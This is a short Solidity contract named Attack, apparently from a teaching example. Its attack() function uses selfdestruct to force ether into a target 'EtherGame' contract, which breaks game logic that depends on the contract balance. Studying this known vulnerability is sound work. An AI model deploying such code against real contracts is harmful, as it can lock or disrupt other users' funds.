// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {EtherGame} from "./Ethergame.sol";

/**
 * @title
 * @author
 * @notice
 */
contract Attack {
    EtherGame ethergame;

    constructor(address _ethergame) {
        ethergame = EtherGame(_ethergame);
    }

    function attack() public payable {
        address payable addr = payable(address(ethergame));
        selfdestruct(addr);
    }
}
